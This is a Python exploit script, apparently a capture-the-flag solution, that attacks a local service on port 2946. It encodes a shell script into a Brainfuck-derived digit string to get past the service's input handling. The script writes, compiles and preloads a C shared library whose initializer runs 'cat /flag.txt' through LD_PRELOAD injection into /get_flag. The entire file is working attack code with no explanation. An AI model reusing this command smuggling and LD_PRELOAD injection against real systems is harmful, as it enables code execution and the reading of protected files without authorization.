#!/usr/bin/env python3

import socket
import sys
import time
import secrets
import math

def refactor(nr):
    root = int(math.sqrt(nr))
    rest = nr - (root**2)
    return root, rest

def brainfuckify(text):
    old = 0
    out = ""
    out += '[-]'
    for character in text:
        _ord = ord(character)
        if old == _ord:
            out += '.'
            continue

        deviation = _ord - old

        mult = refactor(abs(deviation))

        if 0 < deviation:
            if deviation < 6:
                out += '{}.'.format('+'*deviation)
            else:
                out += '>{}[<{}>-]<{}.'.format('+'*mult[0],'+'*mult[0],'+'*mult[1])
        else:
            if deviation > -6:
                out += '{}.'.format('-'*abs(deviation))
            else:
                out += '>{}[<{}>-]<{}.'.format('+'*mult[0],'-'*mult[0],'-'*mult[1])
        old = _ord

    out += '[-]'
    return out

def brainfuskatorify(code):
    bfc="+-.><,[]"
    bf = brainfuckify(code)

    out = ""
    for i, c in enumerate(bf.replace(" ", "").replace("\n", "")):
        if c in bfc:
            out += "%d" % ((i+bfc.index(c))%10)
    return out

def recvuntil(a):
    buf = b''
    while a not in buf:
        buf += sock.recv(1)
    return buf

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 2946))

time.sleep(0.1)

C_CODE = "#include <stdlib.h>\\nvoid _init() { unsetenv(\"LD_PRELOAD\"); system(\"cat /flag.txt\"); }"
C_COMPILE = "gcc -nostartfiles -shared -o exploit.so exploit.c"
DIRNAME = secrets.token_urlsafe(8)
SCRIPT = f"""
mkdir /tmp/{DIRNAME}
cd /tmp/{DIRNAME}
pwd
echo writing file
printf '{C_CODE}' > exploit.c
echo compiling
{C_COMPILE}
echo running
LD_PRELOAD=./exploit.so /get_flag
echo done
"""

print(recvuntil(b"\n"))
print(recvuntil(b"\n"))
script = brainfuskatorify(SCRIPT).encode()
sock.send(script + b"\n")
while True:
    line = recvuntil(b"\n")
    print(line)
    if b'CSR' in line:
        break
